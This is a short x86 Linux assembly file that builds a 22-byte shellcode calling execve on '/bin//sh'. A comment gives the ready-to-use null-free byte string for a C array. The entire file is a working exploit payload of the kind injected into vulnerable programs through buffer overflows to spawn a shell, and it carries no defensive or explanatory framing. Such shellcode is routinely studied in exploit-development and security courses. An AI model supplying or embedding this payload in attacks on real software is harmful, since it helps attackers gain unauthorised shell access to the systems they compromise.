.text
.globl _start
_start:
	xorl %eax, %eax
	movb $0xb, %al		# sys_execve
	cdq			# env = %edx = NULL
	pushl %edx		# null-terminator byte(s)
	pushl $0x68732f2f	# //sh
	pushl $0x6e69622f	# /bin
	movl %esp, %ebx		# "/bin//sh" addr
	movl %edx, %ecx		# argv = %ecx = NULL 
	int $0x80		# syscall

# char shellcode[] = "\x31\xc0\xb0\x0b\x99\x52\x68//sh\x68/bin\x89\xe3\x89\xd1\xcd\x80";
# /* Total: 22 bytes. */
